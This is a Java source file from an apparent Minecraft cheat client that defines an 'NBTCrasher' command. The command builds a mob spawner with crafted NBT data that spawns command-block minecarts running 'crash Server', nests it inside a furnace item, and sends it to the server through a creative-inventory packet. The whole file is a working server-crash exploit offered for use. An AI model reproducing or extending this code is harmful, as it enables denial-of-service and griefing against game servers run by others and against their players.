package me.bratwurst.module.Commands;




import me.bratwurst.manager.Command;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class NBT_Crasher extends Command {
    public String Msg = "Du Hast Ein TpSpawner erhalten";

    public NBT_Crasher() {
        super("NBTC", "NBTCrasher", "Nbtcrasher");
    }





    @Override
    public void onCommand(String command, String[] args) {
        if (args.length != 1) {
            PlayerUtils.sendMessage("nbtcrasher");
            return;
        }
        (Minecraft.getMinecraft()).thePlayer.sendQueue.addToSendQueue((Packet)new C10PacketCreativeInventoryAction(36, getItemInFurnace(generateCommandBlockWithCommand("crash Server"))));
        PlayerUtils.sendMessage("hast einen Crash-Spawner erhalten.");
    }

    public ItemStack generateCommandBlockWithCommand(String command) {
        ItemStack item = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "FallingSand");
        blockEntityTag.setInteger("SpawnCount", 1);
        blockEntityTag.setInteger("SpawnRange", 5);
        blockEntityTag.setInteger("RequiredPlayerRange", 100);
        blockEntityTag.setInteger("MinSpawnDelay", 1);
        blockEntityTag.setInteger("MaxSpawnDelay", 1);
        blockEntityTag.setInteger("MaxNearbyEntities", 100);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setString("Tile", "minecraft:command_block_minecart");
        spawnData.setString("Block", "minecraft:command_block_minecart");
        spawnData.setInteger("Time", 1);
        NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Command", command);
        spawnData.setTag("TileEntityData", (NBTBase)tag);
        blockEntityTag.setTag("SpawnData", (NBTBase)spawnData);
        base.setTag("BlockEntityTag", (NBTBase)blockEntityTag);
        item.setTagCompound(base);
        return item;
    }

    public ItemStack getItemInFurnace(ItemStack stack) {
        ItemStack furnance = new ItemStack(Blocks.furnace);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setShort("BurnTime", (short)0);
        blockEntityTag.setShort("CookTime", (short)0);
        blockEntityTag.setShort("CookTimeTotal", (short)200);
        blockEntityTag.setString("id", "Furnace");
        NBTTagList items = new NBTTagList();
        NBTTagCompound item = new NBTTagCompound();
        item.setByte("Count", (byte)1);
        item.setShort("Damage", (short)stack.getItemDamage());
        item.setString("id", "minecraft:mob_spawner");
        item.setShort("Slot", (short)0);
        item.setTag("tag", (NBTBase)stack.getTagCompound());
        items.appendTag((NBTBase)item);
        blockEntityTag.setTag("Items", (NBTBase)items);
        base.setTag("BlockEntityTag", (NBTBase)blockEntityTag);
        furnance.setTagCompound(base);
        return furnance;
    }
}
